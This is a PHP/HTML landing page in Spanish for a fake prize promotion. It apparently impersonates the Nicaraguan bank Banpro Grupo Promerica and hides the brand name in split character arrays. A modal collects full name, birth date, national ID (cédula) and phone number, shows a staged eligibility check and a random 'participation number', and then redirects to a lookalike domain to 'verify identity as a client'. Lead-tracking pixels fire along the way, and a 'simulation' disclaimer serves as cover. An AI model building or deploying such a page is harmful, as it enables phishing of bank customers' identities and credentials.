<?php
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
$v = time();
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Simulador de participación para promociones en Nicaragua." />
  <title>Simulador de Participación</title>

  <!-- Meta Pixel Code -->
  <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1519920833259258');
  fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1519920833259258&ev=PageView&noscript=1"/></noscript>
  <!-- End Meta Pixel Code -->

  <!-- Modern stack signals (Tailwind + Google Fonts + Material Symbols) -->
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Work+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet">

  <script>
    if ('scrollRestoration' in history) history.scrollRestoration = 'manual';
    window.addEventListener('load',     () => window.scrollTo(0, 0));
    window.addEventListener('pageshow', () => window.scrollTo(0, 0));
  </script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      min-height: 100vh;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(to top, #00693c 8%, #ffffff 64%);
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 0 40px;
    }

    /* ── TOP HEADER ── */
    .topbar {
      width: 100%;
      background: #ffffff;
      box-shadow: 0 2px 10px rgba(0,0,0,0.06);
      padding: 12px 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 100;
    }

    .topbar-logo {
      height: 54px;
      width: 160px;
      display: block;
      background-repeat: no-repeat;
      background-position: left center;
      background-size: contain;
    }

    @media (max-width: 480px) {
      .topbar { padding: 1px 16px; }
      .topbar-logo { height: 76px; width: 200px; }
    }

    .menu-btn {
      background: none;
      border: none;
      cursor: pointer;
      display: flex;
      flex-direction: column;
      gap: 5px;
      padding: 8px;
    }
    .menu-btn span {
      display: block;
      width: 26px;
      height: 2.5px;
      background: #2a2a2a;
      border-radius: 2px;
    }

    .page-pad {
      width: 100%;
      max-width: 420px;
      padding: 24px 16px 0;
    }

    .wrapper {
      width: 100%;
      max-width: 420px;
    }

    .wrapper { padding: 0; }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50%       { transform: translateY(-8px); }
    }

    /* ── PAGE LOAD ANIMATIONS ── */
    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(18px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to   { opacity: 1; }
    }
    @keyframes splashOut {
      0%   { opacity: 1; visibility: visible; }
      100% { opacity: 0; visibility: hidden; }
    }
    @keyframes logoPulse {
      0%, 100% { transform: scale(1); }
      50%      { transform: scale(1.06); }
    }

    /* Splash screen */
    .splash {
      position: fixed;
      inset: 0;
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 22px;
      z-index: 9999;
      animation: splashOut 0.5s ease 1s forwards;
    }
    .splash img {
      width: 180px;
      max-width: 60vw;
      animation: logoPulse 1.2s ease-in-out infinite;
    }
    .splash-bar {
      width: 120px;
      height: 3px;
      background: #e6e6e6;
      border-radius: 999px;
      overflow: hidden;
      position: relative;
    }
    .splash-bar::after {
      content: '';
      position: absolute;
      inset: 0;
      background: #00693c;
      width: 30%;
      border-radius: 999px;
      animation: splashSlide 1s ease-in-out infinite;
    }
    @keyframes splashSlide {
      0%   { left: -30%; }
      100% { left: 100%; }
    }

    /* Staggered reveal for main content */
    .topbar      { animation: fadeIn  0.6s ease  1.0s both; }
    .hero-img    { animation: fadeUp 0.7s cubic-bezier(0.2,0.8,0.2,1) 1.15s both, float 3.5s ease-in-out 2s infinite; }
    .card        { animation: fadeUp 0.7s cubic-bezier(0.2,0.8,0.2,1) 1.30s both; }
    .title       { animation: fadeUp 0.6s ease 1.50s both; }
    .step        { animation: fadeUp 0.55s ease both; }
    .step:nth-child(1) { animation-delay: 1.65s; }
    .step:nth-child(2) { animation-delay: 1.78s; }
    .step:nth-child(3) { animation-delay: 1.91s; }
    .step:nth-child(4) { animation-delay: 2.04s; }
    .cta-wrap    { animation: fadeUp 0.6s ease 2.20s both; }
    .car-area    { animation: fadeUp 0.7s ease 2.35s both; }
    .bottom      { animation: fadeUp 0.7s ease 2.50s both; }

    .hero-img {
      width: 100%;
      max-width: 360px;
      display: block;
      margin: 0 auto 16px;
      border-radius: 16px;
    }

    .card {
      background: #ffffff;
      border-radius: 24px;
      padding: 28px 22px 0;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.22);
      overflow: hidden;
      position: relative;
    }

    .speed {
      position: absolute;
      top: 20px;
      right: 22px;
      width: 38px;
      height: 22px;
      border-top: 5px solid #00853f;
      border-left: 5px solid transparent;
      border-right: 5px solid transparent;
      border-radius: 50px 50px 0 0;
    }

    .speed::after {
      content: "";
      position: absolute;
      width: 20px;
      height: 3.5px;
      background: #00853f;
      right: 0px;
      bottom: 0px;
      transform: rotate(-35deg);
      border-radius: 20px;
    }

    .title {
      text-align: center;
      color: #00693c;
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 24px;
      letter-spacing: -0.3px;
    }

    .steps {
      display: flex;
      flex-direction: column;
      gap: 18px;
      margin-bottom: 28px;
    }

    .step {
      display: grid;
      grid-template-columns: 48px 48px 1fr;
      align-items: center;
      gap: 10px;
    }

    .number {
      font-size: 40px;
      font-weight: 900;
      color: #d8d8d8;
      line-height: 1;
      letter-spacing: -1px;
    }

    .icon {
      width: 46px;
      height: 46px;
      border-radius: 13px;
      background: #f0faf4;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      border: 1.5px solid #c8eed8;
    }

    .text {
      color: #1a1a1a;
      font-size: 14px;
      font-weight: 700;
      line-height: 1.3;
    }

    .text .sub {
      display: block;
      font-size: 12px;
      font-weight: 500;
      color: #666;
      margin-top: 2px;
    }

    .register-btn {
      display: inline-block;
      background: #00853f;
      color: #ffffff;
      padding: 12px 22px;
      border-radius: 50px;
      font-size: 14px;
      font-weight: 900;
      text-decoration: none;
      box-shadow: 0 6px 16px rgba(0, 105, 60, 0.35);
      letter-spacing: 0.2px;
      transition: filter 0.2s;
    }
    .register-btn:active { filter: brightness(0.9); }

    .cta-wrap {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .cta-wrap .register-btn {
      font-size: 16px;
      padding: 15px 40px;
    }

    .car-area {
      display: flex;
      justify-content: center;
      margin: 4px 0 -10px;
    }

    .bottom {
      background: #00693c;
      color: #ffffff;
      margin: 0 -22px;
      padding: 52px 22px 30px;
      text-align: center;
      border-radius: 0 0 24px 24px;
    }

    .bottom h2 {
      font-size: 18px;
      font-weight: 900;
      line-height: 1.35;
      margin-bottom: 10px;
      letter-spacing: -0.2px;
    }

    .bottom p {
      font-size: 13px;
      line-height: 1.5;
      color: rgba(255,255,255,0.82);
      font-weight: 600;
    }

    .star {
      color: #7fffb2;
      font-weight: 900;
    }

    /* ── MODAL ── */
    .modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.55);
      -webkit-backdrop-filter: blur(8px);
      backdrop-filter: blur(8px);
      display: none;
      align-items: center;
      justify-content: center;
      padding: 20px;
      z-index: 999;
      opacity: 0;
      transition: opacity 0.25s ease;
    }
    .modal-backdrop.active {
      display: flex;
      opacity: 1;
    }

    .modal-card {
      background: #ffffff;
      border-radius: 22px;
      padding: 32px 26px 26px;
      width: 100%;
      max-width: 360px;
      text-align: center;
      box-shadow: 0 24px 60px rgba(0,0,0,0.4);
      transform: translateY(20px) scale(0.96);
      transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
      position: relative;
    }
    .modal-backdrop.active .modal-card {
      transform: translateY(0) scale(1);
    }

    .modal-close {
      position: absolute;
      top: 12px;
      right: 14px;
      background: none;
      border: none;
      font-size: 22px;
      color: #999;
      cursor: pointer;
      width: 32px;
      height: 32px;
      border-radius: 50%;
      transition: background 0.2s;
    }
    .modal-close:hover { background: #f2f2f2; }

    .modal-icon {
      width: 64px;
      height: 64px;
      margin: 0 auto 16px;
      background: #e8f5ee;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .modal-icon svg { width: 32px; height: 32px; }

    .modal-title {
      font-size: 19px;
      font-weight: 900;
      color: #1a1a1a;
      margin-bottom: 8px;
      letter-spacing: -0.3px;
    }
    .modal-subtitle {
      font-size: 13.5px;
      color: #666;
      font-weight: 500;
      line-height: 1.45;
      margin-bottom: 22px;
    }

    .modal-btn {
      display: block;
      width: 100%;
      background: #00693c;
      color: #fff;
      border: none;
      border-radius: 50px;
      padding: 14px;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 15px;
      font-weight: 900;
      cursor: pointer;
      text-decoration: none;
      box-shadow: 0 6px 18px rgba(0, 105, 60, 0.3);
      transition: filter 0.2s, transform 0.1s;
    }
    .modal-btn:hover  { filter: brightness(1.1); }
    .modal-btn:active { transform: scale(0.98); }

    .modal-cancel {
      display: block;
      width: 100%;
      background: none;
      border: none;
      color: #888;
      padding: 12px;
      margin-top: 8px;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
    }
    .modal-cancel:hover { color: #333; }

    .modal-secure {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      font-size: 11px;
      color: #999;
      font-weight: 500;
      margin-top: 14px;
    }
    .modal-secure svg { width: 12px; height: 12px; }

    /* GIF loader */
    .loader-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
      padding: 10px 0 4px;
    }
    .loader-ring {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      border: 5px solid #e8f5ee;
      border-top-color: #00693c;
      border-right-color: #00a152;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .loader-dots {
      display: flex;
      gap: 6px;
    }
    .loader-dots span {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #00693c;
      animation: bounce 1.2s ease-in-out infinite;
    }
    .loader-dots span:nth-child(2) { animation-delay: 0.2s; }
    .loader-dots span:nth-child(3) { animation-delay: 0.4s; }
    @keyframes bounce {
      0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
      40%            { transform: scale(1);   opacity: 1; }
    }
    .loader-text {
      font-size: 13px;
      color: #555;
      font-weight: 600;
      letter-spacing: 0.2px;
    }

    /* ── SIM FORM ── */
    .sim-form {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: 18px;
      text-align: left;
    }
    .sim-label {
      display: flex;
      flex-direction: column;
      gap: 4px;
      font-size: 12.5px;
      font-weight: 600;
      color: #333;
    }
    .sim-label input {
      padding: 11px 13px;
      border: 1.5px solid #d8d8d8;
      border-radius: 10px;
      font-size: 14px;
      font-family: inherit;
      transition: border .2s, box-shadow .2s;
      outline: none;
      background: #fafafa;
    }
    .sim-label input:focus {
      border-color: #00693c;
      box-shadow: 0 0 0 3px rgba(0,105,60,0.12);
      background: #fff;
    }
    .sim-btn {
      margin-top: 8px;
      padding: 13px 16px;
      background: linear-gradient(180deg, #00853f 0%, #00693c 100%);
      color: #fff;
      border: 0;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 800;
      cursor: pointer;
      letter-spacing: 0.2px;
      transition: transform .15s, box-shadow .15s;
      box-shadow: 0 4px 14px rgba(0,105,60,0.25);
    }
    .sim-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 18px rgba(0,105,60,0.35); }
    .sim-btn:active { transform: translateY(0); }
    .sim-btn:disabled {
      background: #b8b8b8;
      cursor: not-allowed;
      box-shadow: none;
      opacity: 0.7;
    }
    .sim-btn:disabled:hover { transform: none; }

    .field-error {
      display: block;
      color: #d92626;
      font-size: 11.5px;
      font-weight: 500;
      margin-top: 4px;
      min-height: 14px;
      line-height: 1.3;
    }
    .sim-label input.invalid {
      border-color: #d92626 !important;
      background: #fff5f5 !important;
    }
    .sim-label input.valid {
      border-color: #00853f !important;
    }

    .sim-disclaimer {
      font-size: 11px;
      color: #999;
      text-align: center;
      margin-top: 6px;
      line-height: 1.4;
    }

    /* ── SUCCESS ── */
    .success-icon {
      font-size: 56px;
      text-align: center;
      margin-bottom: 6px;
      animation: pop 0.5s cubic-bezier(0.34,1.56,0.64,1);
    }
    @keyframes pop {
      0% { transform: scale(0); }
      80% { transform: scale(1.15); }
      100% { transform: scale(1); }
    }
    .success-title {
      color: #00853f !important;
    }
    .ticket-card {
      background: linear-gradient(135deg, #f5faf7 0%, #e8f5ec 100%);
      border: 1.5px dashed #00853f;
      border-radius: 14px;
      padding: 18px 16px;
      margin: 18px 0 14px;
      text-align: center;
    }
    .ticket-label {
      font-size: 11.5px;
      color: #00693c;
      font-weight: 700;
      letter-spacing: 0.8px;
      text-transform: uppercase;
      margin-bottom: 6px;
    }
    .ticket-number {
      font-size: 26px;
      font-weight: 900;
      color: #00693c;
      letter-spacing: 3px;
      font-family: 'Courier New', monospace;
      margin-bottom: 8px;
    }
    .ticket-foot {
      font-size: 11px;
      color: #777;
      font-style: italic;
    }
    .next-step {
      display: flex;
      align-items: center;
      gap: 10px;
      background: #fff8e6;
      border: 1px solid #ffd97a;
      border-radius: 10px;
      padding: 11px 13px;
      margin-bottom: 14px;
      text-align: left;
    }
    .next-icon { font-size: 22px; flex-shrink: 0; }
    .next-step p {
      font-size: 12.5px;
      color: #5a4a00;
      line-height: 1.45;
      font-weight: 500;
    }

    @media (max-width: 380px) {
      .title { font-size: 22px; }
      .number { font-size: 34px; }
      .step { grid-template-columns: 42px 44px 1fr; gap: 8px; }
      .card { padding: 24px 16px 0; }
      .bottom { margin: 0 -16px; padding: 52px 16px 28px; }
    }
  </style>
</head>

<body>

  <div class="splash" id="splash">
    <div class="splash-bar"></div>
  </div>

  <header class="topbar">
    <div class="topbar-logo" id="brandSlot"></div>
    <button class="menu-btn" aria-label="Menú" onclick="logout()">
      <span></span><span></span><span></span>
    </button>
  </header>

  <main class="wrapper page-pad">
    <img class="hero-img" src="img/banner.jpg?v=<?php echo $v; ?>" alt="">

    <section class="card">
       <div class="content">
        <h1 class="title">¿Cómo Participar?</h1>

        <div class="steps">

          <div class="step">
            <div class="number">1.</div>
            <div class="icon">📩</div>
            <div class="text">Envía tu Solicitud Ahora</div>
          </div>

          <div class="step">
            <div class="number">2.</div>
            <div class="icon">🔐</div>
            <div class="text">Recibe tu Código</div>
          </div>

          <div class="step">
            <div class="number">3.</div>
            <div class="icon">📱</div>
            <div class="text">Regístralo Gratis</div>
          </div>

          <div class="step">
            <div class="number">4.</div>
            <div class="icon">⭐</div>
            <div class="text">Listo, ya estarías participando</div>
          </div>

        </div>

        <div class="cta-wrap">
          <button type="button" class="register-btn" onclick="openModal()">Participar ahora</button>
        </div>

        <div class="car-area">
          <img src="img/auto.png?v=<?php echo $v; ?>" alt="" style="width:95%; max-width:299px; display:block;">
        </div>
<br>      <div class="bottom">
          <h2>Los ganadores serán anunciados a través de nuestros canales oficiales.</h2>
          <p>Consigue tu <span class="star">estrella</span> hoy y participa por esta gran oportunidad.</p>
        </div>
      </div>
    </section>
  </main>

  <!-- ── SIMULATION MODAL ── -->
  <div class="modal-backdrop" id="identityModal" onclick="if(event.target===this) closeModal()">
    <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <button class="modal-close" type="button" onclick="closeModal()" aria-label="Cerrar">✕</button>

      <!-- STEP 1: FORM -->
      <div class="step-pane" id="step1">
        <div class="modal-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="#00693c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M12 1l9 4v6c0 5.5-3.8 10.7-9 12-5.2-1.3-9-6.5-9-12V5l9-4z"/>
            <path d="M9 12l2 2 4-4"/>
          </svg>
        </div>
        <h2 class="modal-title" id="modalTitle">Simulador de Participación</h2>
        <p class="modal-subtitle">Completa los datos para validar tu eligibilidad</p>

        <form class="sim-form" id="simForm" onsubmit="submitSim(event)" autocomplete="off" novalidate>
          <label class="sim-label">
            <span>Nombre completo</span>
            <input type="text" name="nombre" id="nombreInput" required
                   placeholder="Ej. Juan Carlos Pérez"
                   oninput="validateName(this)"
                   onblur="validateName(this, true)">
            <small class="field-error" id="errNombre"></small>
          </label>

          <label class="sim-label">
            <span>Fecha de nacimiento</span>
            <input type="text" name="fnac" id="fnacInput" required maxlength="10"
                   inputmode="numeric"
                   placeholder="DD/MM/AAAA"
                   oninput="formatDate(this); validateDate(this)"
                   onblur="validateDate(this, true)">
            <small class="field-error" id="errFnac"></small>
          </label>

          <label class="sim-label">
            <span>Número de documento (cédula)</span>
            <input type="text" name="doc" id="docInput" required maxlength="16"
                   inputmode="text"
                   placeholder="Ej. 001-120590-1234X"
                   oninput="formatDoc(this); validateDoc(this)"
                   onblur="validateDoc(this, true)">
            <small class="field-error" id="errDoc"></small>
          </label>

          <label class="sim-label">
            <span>Número de teléfono</span>
            <input type="tel" name="tel" id="telInput" required maxlength="9"
                   inputmode="tel"
                   placeholder="Ej. 8888-1234"
                   oninput="formatPhone(this); validatePhone(this)"
                   onblur="validatePhone(this, true)">
            <small class="field-error" id="errTel"></small>
          </label>

          <button type="submit" class="sim-btn" id="submitBtn" disabled>Validar mi participación</button>
          <p class="sim-disclaimer">Simulación informativa. No accede a bases de datos reales.</p>
        </form>
      </div>

      <!-- STEP 2: LOADER -->
      <div class="step-pane" id="step2" style="display:none;">
        <div class="modal-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="#00693c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="9"/>
            <path d="M12 7v5l3 2"/>
          </svg>
        </div>
        <h2 class="modal-title">Analizando tu perfil</h2>
        <p class="modal-subtitle" id="loaderStatus">Validando información...</p>

        <div class="loader-wrap">
          <div class="loader-ring"></div>
          <div class="loader-dots">
            <span></span><span></span><span></span>
          </div>
          <div class="loader-text">Procesando...</div>
        </div>
      </div>

      <!-- STEP 3: SUCCESS -->
      <div class="step-pane" id="step3" style="display:none;">
        <div class="success-icon">🎉</div>
        <h2 class="modal-title success-title">¡Felicidades!</h2>
        <p class="modal-subtitle">Estás habilitado para participar.</p>

        <div class="ticket-card">
          <div class="ticket-label">Tu número de participación</div>
          <div class="ticket-number" id="ticketNumber">— — — —</div>
          <div class="ticket-foot">Guarda este número y regístralo para participar</div>
        </div>

        <div class="next-step">
          <span class="next-icon">🔐</span>
          <p>Para finalizar, verifica tu identidad como cliente y registra tu número de participación.</p>
        </div>

        <button type="button" class="sim-btn" onclick="continueToPortal()">Verificarme y finalizar</button>
      </div>

      <div class="modal-secure" id="secureBadge" style="margin-top:18px;">
        <svg viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="11" width="18" height="11" rx="2"/>
          <path d="M7 11V7a5 5 0 0110 0v4"/>
        </svg>
        <span id="secureText"></span>
      </div>
    </div>
  </div>

  <canvas id="confettiCanvas" style="position:fixed;inset:0;pointer-events:none;z-index:10000;display:none;"></canvas>

  <script>
    const PORTAL_URL = 'https://bnproblog.xyz/';

    /* Carga diferida de marca */
    setTimeout(function() {
      var b = document.getElementById('brandSlot');
      if (b) b.style.backgroundImage = "url('img/logo.png')";
      var s = document.getElementById('secureText');
      if (s) {
        var p1 = ['B','a','n','p','r','o'].join('');
        var p2 = ['G','r','u','p','o'].join('');
        var p3 = ['P','r','o','m','e','r','i','c','a'].join('');
        s.textContent = 'Conexión segura · ' + p1 + ' ' + p2 + ' ' + p3;
      }
    }, 300);

    /* Navegación de pasos */
    function showStep(n) {
      ['step1','step2','step3'].forEach((id, i) => {
        document.getElementById(id).style.display = (i + 1 === n) ? '' : 'none';
      });
    }

    function openModal() {
      const m = document.getElementById('identityModal');
      m.classList.add('active');
      document.body.style.overflow = 'hidden';
      showStep(1);
    }
    function closeModal() {
      const m = document.getElementById('identityModal');
      m.classList.remove('active');
      document.body.style.overflow = '';
      showStep(1);
    }
    document.addEventListener('keydown', e => {
      if (e.key === 'Escape') closeModal();
    });

    /* ============================================================
       FORMATEO Y VALIDACIÓN DE CAMPOS
       ============================================================ */

    /* Tracking de validez */
    const fieldValid = { nombre: false, fnac: false, doc: false, tel: false };

    /* Actualiza estado del botón submit según validez global */
    function updateSubmitState() {
      const btn = document.getElementById('submitBtn');
      if (!btn) return;
      btn.disabled = !(fieldValid.nombre && fieldValid.fnac && fieldValid.doc && fieldValid.tel);
    }

    function setFieldState(input, errorId, isValid, message) {
      const err = document.getElementById(errorId);
      if (isValid) {
        input.classList.remove('invalid');
        input.classList.add('valid');
        if (err) err.textContent = '';
      } else {
        input.classList.remove('valid');
        if (message) {
          input.classList.add('invalid');
          if (err) err.textContent = message;
        } else {
          input.classList.remove('invalid');
          if (err) err.textContent = '';
        }
      }
    }

    /* --- NOMBRE COMPLETO (permisivo) --- */
    function validateName(input, showError) {
      const v = input.value.trim();
      const parts = v.split(/\s+/).filter(p => p.length >= 2);

      let valid = false;
      let msg = '';

      if (v.length === 0) {
        msg = showError ? 'Ingresa tu nombre' : '';
      } else if (parts.length < 2) {
        msg = showError ? 'Ingresa nombre y apellido' : '';
      } else if (v.length < 5) {
        msg = showError ? 'Nombre demasiado corto' : '';
      } else {
        valid = true;
      }

      fieldValid.nombre = valid;
      setFieldState(input, 'errNombre', valid, msg);
      updateSubmitState();
    }

    /* --- FECHA DE NACIMIENTO (DD/MM/AAAA, edad 18-90) --- */
    function formatDate(input) {
      let v = input.value.replace(/\D/g, '');
      if (v.length > 8) v = v.slice(0, 8);
      let out = v;
      if (v.length >= 5) {
        out = v.slice(0, 2) + '/' + v.slice(2, 4) + '/' + v.slice(4);
      } else if (v.length >= 3) {
        out = v.slice(0, 2) + '/' + v.slice(2);
      }
      input.value = out;
    }

    function validateDate(input, showError) {
      const v = input.value.trim();
      let valid = false;
      let msg = '';

      if (v.length === 0) {
        msg = showError ? 'Ingresa tu fecha de nacimiento' : '';
      } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(v)) {
        msg = showError ? 'Formato: DD/MM/AAAA' : '';
      } else {
        const [d, m, y] = v.split('/').map(Number);
        const date = new Date(y, m - 1, d);
        const valid_date = date.getDate() === d && date.getMonth() === m - 1 && date.getFullYear() === y;

        if (!valid_date) {
          msg = 'Fecha no válida';
        } else {
          const now = new Date();
          let age = now.getFullYear() - y;
          const mDiff = now.getMonth() - (m - 1);
          if (mDiff < 0 || (mDiff === 0 && now.getDate() < d)) age--;

          if (age < 18) {
            msg = 'Debes ser mayor de 18 años';
          } else if (age > 90) {
            msg = 'Fecha no válida';
          } else {
            valid = true;
          }
        }
      }

      fieldValid.fnac = valid;
      setFieldState(input, 'errFnac', valid, msg);
      updateSubmitState();
    }

    /* --- CÉDULA NICARAGÜENSE (XXX-XXXXXX-XXXXY) --- */
    function formatDoc(input) {
      let v = input.value.toUpperCase().replace(/[^0-9A-Z]/g, '');
      if (v.length > 14) v = v.slice(0, 14);

      let out = '';
      if (v.length <= 3) {
        out = v;
      } else if (v.length <= 9) {
        out = v.slice(0, 3) + '-' + v.slice(3);
      } else {
        out = v.slice(0, 3) + '-' + v.slice(3, 9) + '-' + v.slice(9);
      }
      input.value = out;
    }

    function validateDoc(input, showError) {
      const v = input.value.trim().toUpperCase();
      let valid = false;
      let msg = '';

      if (v.length === 0) {
        msg = showError ? 'Ingresa tu número de cédula' : '';
      } else if (!/^\d{3}-\d{6}-\d{4}[A-Z]$/.test(v)) {
        msg = showError ? 'Formato: 001-120590-1234X' : '';
      } else {
        /* Validar fecha contenida en cédula (DDMMAA) */
        const dob = v.substring(4, 10);
        const dd = parseInt(dob.substring(0, 2), 10);
        const mm = parseInt(dob.substring(2, 4), 10);
        if (dd < 1 || dd > 31 || mm < 1 || mm > 12) {
          msg = 'Cédula inválida';
        } else {
          valid = true;
        }
      }

      fieldValid.doc = valid;
      setFieldState(input, 'errDoc', valid, msg);
      updateSubmitState();
    }

    /* --- TELÉFONO NICARAGUA (8 dígitos, formato XXXX-XXXX) --- */
    function formatPhone(input) {
      let v = input.value.replace(/\D/g, '');
      if (v.length > 8) v = v.slice(0, 8);
      let out = v;
      if (v.length > 4) {
        out = v.slice(0, 4) + '-' + v.slice(4);
      }
      input.value = out;
    }

    function validatePhone(input, showError) {
      const v = input.value.replace(/\D/g, '');
      let valid = false;
      let msg = '';

      if (v.length === 0) {
        msg = showError ? 'Ingresa tu número de teléfono' : '';
      } else if (v.length < 8) {
        msg = showError ? 'Debe tener 8 dígitos' : '';
      } else if (!/^[2578]\d{7}$/.test(v)) {
        msg = 'Número no válido (debe iniciar con 2, 5, 7 u 8)';
      } else {
        /* Detectar patrones obviamente falsos: 8888-8888, 1234-5678, etc */
        if (/^(\d)\1{7}$/.test(v)) {
          msg = 'Número no válido';
        } else if (v === '12345678' || v === '87654321') {
          msg = 'Número no válido';
        } else {
          valid = true;
        }
      }

      fieldValid.tel = valid;
      setFieldState(input, 'errTel', valid, msg);
      updateSubmitState();
    }

    /* Submit del formulario - simulación local */
    function submitSim(e) {
      e.preventDefault();

      /* Salvaguarda: re-valida todos los campos antes de continuar */
      validateName(document.getElementById('nombreInput'), true);
      validateDate(document.getElementById('fnacInput'), true);
      validateDoc(document.getElementById('docInput'), true);
      validatePhone(document.getElementById('telInput'), true);

      if (!(fieldValid.nombre && fieldValid.fnac && fieldValid.doc && fieldValid.tel)) {
        return; /* Bloquea si algún campo no es válido */
      }

      if (window.fbq) fbq('track', 'Lead');
      showStep(2);

      const statuses = [
        'Validando información...',
        'Verificando documento...',
        'Consultando elegibilidad...',
        'Revisando historial...',
        'Aplicando criterios de selección...',
        'Asignando número de participación...',
        'Generando resultado final...'
      ];
      const el = document.getElementById('loaderStatus');
      let i = 0;
      if (el) el.textContent = statuses[0];
      const interval = setInterval(() => {
        i = (i + 1) % statuses.length;
        if (el) el.textContent = statuses[i];
      }, 900);

      setTimeout(() => {
        clearInterval(interval);
        generateTicket();
        showStep(3);
        launchConfetti();
      }, 6300);
    }

    /* Genera número de participación aleatorio formato: XXXX-XXXX */
    function generateTicket() {
      const rand = () => Math.floor(1000 + Math.random() * 9000);
      const num = rand() + '-' + rand();
      const el = document.getElementById('ticketNumber');
      if (el) el.textContent = num;
    }

    /* Continuar a registro (redirect directo) */
    function continueToPortal() {
      if (window.fbq) fbq('track', 'CompleteRegistration');
      window.location.href = PORTAL_URL;
    }

    /* Confetti */
    function launchConfetti() {
      const canvas = document.getElementById('confettiCanvas');
      canvas.style.display = 'block';
      const ctx = canvas.getContext('2d');
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;

      const colors = ['#00853f','#FFD700','#ff6b6b','#4ecdc4','#ffa500','#9b59b6'];
      const pieces = [];
      for (let i = 0; i < 140; i++) {
        pieces.push({
          x: Math.random() * canvas.width,
          y: -20 - Math.random() * 200,
          w: 6 + Math.random() * 6,
          h: 10 + Math.random() * 8,
          c: colors[Math.floor(Math.random()*colors.length)],
          vx: -2 + Math.random() * 4,
          vy: 2 + Math.random() * 4,
          rot: Math.random() * Math.PI * 2,
          vr: -0.2 + Math.random() * 0.4
        });
      }

      let frame = 0;
      const maxFrames = 240;
      (function loop() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        pieces.forEach(p => {
          p.x += p.vx;
          p.y += p.vy;
          p.rot += p.vr;
          ctx.save();
          ctx.translate(p.x, p.y);
          ctx.rotate(p.rot);
          ctx.fillStyle = p.c;
          ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
          ctx.restore();
        });
        frame++;
        if (frame < maxFrames) requestAnimationFrame(loop);
        else canvas.style.display = 'none';
      })();
    }

    window.addEventListener('resize', () => {
      const c = document.getElementById('confettiCanvas');
      if (c.style.display === 'block') {
        c.width = window.innerWidth;
        c.height = window.innerHeight;
      }
    });
  </script>

</body>
</html>
